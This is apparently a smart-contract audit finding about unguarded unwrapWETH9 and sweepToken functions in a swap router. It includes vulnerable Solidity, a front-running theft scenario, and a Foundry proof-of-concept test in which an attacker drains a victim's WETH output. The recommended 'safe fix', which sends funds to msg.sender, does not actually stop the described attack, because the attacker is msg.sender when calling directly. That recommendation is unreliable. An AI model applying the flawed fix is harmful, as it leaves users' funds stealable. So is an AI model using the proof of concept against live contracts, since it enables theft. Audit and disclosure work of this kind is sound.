### Title
Unguarded `unwrapWETH9` and `sweepToken` allow any caller to drain router WETH/token balance to an arbitrary address — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

### Summary
`PeripheryPayments.unwrapWETH9` and `sweepToken` are `public payable` with no caller restriction and no binding to the original swap initiator. Any address can call either function at any time, specifying an arbitrary `recipient`, and drain the router's entire balance of WETH or any ERC-20.

### Finding Description
The router's WETH-unwrap flow is designed for use inside an atomic `multicall`: the user bundles `exactInputSingle(…, recipient: address(router))` and `unwrapWETH9(0, user)` into a single transaction. Within that single call the WETH is never exposed between blocks.

However, both `unwrapWETH9` and `sweepToken` are independently callable by any EOA or contract at any time:

```solidity
// PeripheryPayments.sol L37-44
function unwrapWETH9(uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));
    if (balanceWETH < amountMinimum) revert InsufficientWETH(amountMinimum, balanceWETH);
    if (balanceWETH > 0) {
        IWETH9(WETH).withdraw(balanceWETH);
        _transferETH(recipient, balanceWETH);   // recipient is attacker-controlled
    }
}
```

There is no `msg.sender` check, no transient-storage guard tying the call to an active swap, and no minimum-amount enforcement when `amountMinimum = 0`. Any WETH that reaches the router — whether from a non-multicall swap, a partial multicall that reverts mid-sequence, or any other path — is immediately stealable.

### Impact Explanation
Direct theft of user ETH output. A victim who sends `exactInputSingle(tokenIn→WETH, recipient=router)` as a standalone transaction and then attempts to call `unwrapWETH9` in a second transaction will have their entire WETH output stolen by a front-running attacker. The attacker calls `unwrapWETH9(0, attacker)` between the two victim transactions and receives all ETH. Loss equals the full swap output; no residual value remains for the victim.

### Likelihood Explanation
The attack is permissionless and requires only standard mempool observation. Any user who does not bundle their swap and unwrap into a single `multicall` — a pattern that is not enforced by the interface — is vulnerable. Front-running tooling (MEV bots) makes this trivially automatable on any EVM chain.

### Recommendation
Restrict `unwrapWETH9` and `sweepToken` so they can only be invoked as part of an active `multicall` context, or add a `msg.sender`-bound recipient check (i.e., ignore the `recipient` parameter and always send to `msg.sender`). The simplest safe fix is to force `recipient = msg.sender` inside both functions, matching the behavior of `refundETH`:

```solidity
function unwrapWETH9(uint256 amountMinimum, address /*recipient*/) public payable override {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));
    if (balanceWETH < amountMinimum) revert InsufficientWETH(amountMinimum, balanceWETH);
    if (balanceWETH > 0) {
        IWETH9(WETH).withdraw(balanceWETH);
        _transferETH(msg.sender, balanceWETH);
    }
}
```

Within a `multicall` the `delegatecall` preserves `msg.sender` as the original transaction sender, so the intended pattern still works correctly.

### Proof of Concept
```solidity
// Foundry test sketch
function test_attacker_steals_victim_weth_output() public {
    // Victim swaps token1 → WETH, directing output to the router
    vm.prank(victim);
    router.exactInputSingle(ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(token1),
        tokenOut: address(weth),
        zeroForOne: false,
        amountIn: 3_000,
        amountOutMinimum: 0,
        recipient: address(router),   // WETH lands on router
        deadline: block.timestamp + 1,
        priceLimitX64: type(uint128).max,
        extensionData: ""
    }));

    uint256 routerWeth = weth.balanceOf(address(router));
    assertGt(routerWeth, 0, "router holds victim WETH");

    // Attacker front-runs victim's unwrapWETH9 call
    uint256 attackerEthBefore = attacker.balance;
    vm.prank(attacker);
    router.unwrapWETH9(0, attacker);   // amountMinimum=0, recipient=attacker

    assertEq(weth.balanceOf(address(router)), 0, "router drained");
    assertEq(attacker.balance - attackerEthBefore, routerWeth, "attacker received victim ETH");
}
```
